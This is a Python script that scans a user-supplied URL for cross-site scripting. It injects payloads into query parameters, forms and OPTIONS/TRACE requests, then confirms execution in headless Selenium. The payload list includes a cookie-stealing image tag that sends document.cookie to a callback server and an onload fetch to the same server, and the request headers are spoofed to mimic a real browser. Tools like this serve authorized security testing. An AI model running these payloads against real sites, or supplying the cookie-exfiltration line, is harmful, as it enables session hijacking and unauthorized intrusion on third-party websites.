import requests
from bs4 import BeautifulSoup
import urllib.parse
from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
import time

# Modify this to your server URL for external callback testing
external_server_url = "http://localhost:5000/xss?data="

# Set headers and cookies to mimic a real user
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Referer": "https://www.google.com/"
}

# Define your cookies (optional; copy them from your browser if needed)
cookies = {
    # Example cookie
    # "session_id": "your_session_cookie_here"
}

# XSS payloads with external callback, script execution, and DOM changes
xss_payloads = [
    "<script>alert('XSS')</script>",
    f"<img src='{external_server_url}cookie='+document.cookie>",
    "<script>document.body.innerHTML += '<div id=\"xss-test\">XSS Executed</div>';</script>",
    f"<body onload=fetch('{external_server_url}test')>",
    "%3Cscript%3Ealert('XSS')%3C%2Fscript%3E",
]

# Function to inject payloads into URL parameters
def test_xss_in_url(url):
    parsed_url = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed_url.query)

    for payload in xss_payloads:
        if query_params:
            for param in query_params:
                query_params[param] = payload

            encoded_query = urllib.parse.urlencode(query_params, doseq=True)
            polluted_query = encoded_query + f"&{list(query_params.keys())[0]}={payload}"

            test_urls = [
                f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{encoded_query}",
                f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{polluted_query}"
            ]
        else:
            test_urls = [f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?test={payload}"]

        for test_url in test_urls:
            response = requests.get(test_url, headers=headers, cookies=cookies)
            time.sleep(2)  # Delay to avoid rate limiting

            if payload in response.text:
                print(f"[!] Possible XSS vulnerability found at: {test_url}")
                print(f"Payload reflected in response: {payload}")
            else:
                print(f"[-] No XSS detected for payload: {payload}")

            # Dynamic test using Selenium
            simulate_browser_xss(test_url)

# Function to test XSS in form inputs
def test_xss_in_forms(url):
    response = requests.get(url, headers=headers, cookies=cookies)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")

    for form in forms:
        action = form.get("action")
        method = form.get("method", "get").lower()

        data = {}
        inputs = form.find_all("input")
        for input_tag in inputs:
            name = input_tag.get("name")
            if name:
                data[name] = xss_payloads[0]

        form_url = urllib.parse.urljoin(url, action)

        if method == "post":
            response = requests.post(form_url, data=data, headers=headers, cookies=cookies)
        else:
            response = requests.get(form_url, params=data, headers=headers, cookies=cookies)

        if any(payload in response.text for payload in xss_payloads):
            print(f"[!] Possible XSS vulnerability found in form: {form_url}")
        else:
            print(f"[-] No XSS detected in form: {form_url}")

        simulate_browser_xss(form_url)

# Function to dynamically simulate XSS execution using Selenium
def simulate_browser_xss(url):
    try:
        print(f"[*] Testing XSS execution dynamically at: {url}")

        # Start a headless browser with a valid User-Agent
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument(f"user-agent={headers['User-Agent']}")
        driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)

        # Navigate to the URL with the payload
        driver.get(url)
        time.sleep(3)  # Wait for any scripts to execute

        # Check for alert dialogs (common in XSS payloads)
        try:
            alert = driver.switch_to.alert
            print(f"[!] XSS executed successfully at: {url} (Alert triggered)")
            alert.accept()
        except:
            print("[-] No alert triggered.")

        # Check for DOM changes (e.g., payload inserted elements)
        if driver.find_elements_by_id("xss-test"):
            print(f"[!] XSS executed successfully at: {url} (DOM modified)")

        driver.quit()
    except Exception as e:
        print(f"[!] Error during dynamic XSS testing: {e}")

# Function to test alternate HTTP methods for XSS
def test_xss_with_http_methods(url):
    payload = xss_payloads[0]

    response = requests.options(url, params={"q": payload}, headers=headers, cookies=cookies)
    if payload in response.text:
        print(f"[!] Possible XSS vulnerability found using OPTIONS method at: {url}")
    else:
        print(f"[-] No XSS detected using OPTIONS method.")

    response = requests.request("TRACE", url, params={"q": payload}, headers=headers, cookies=cookies)
    if payload in response.text:
        print(f"[!] Possible XSS vulnerability found using TRACE method at: {url}")
    else:
        print(f"[-] No XSS detected using TRACE method.")

# Main function
if __name__ == "__main__":
    target_url = input("Enter the target URL: ")

    print("\nTesting URL parameters for XSS vulnerabilities...")
    test_xss_in_url(target_url)

    print("\nTesting forms for XSS vulnerabilities...")
    test_xss_in_forms(target_url)

    print("\nTesting alternate HTTP methods for XSS vulnerabilities...")
    test_xss_with_http_methods(target_url)
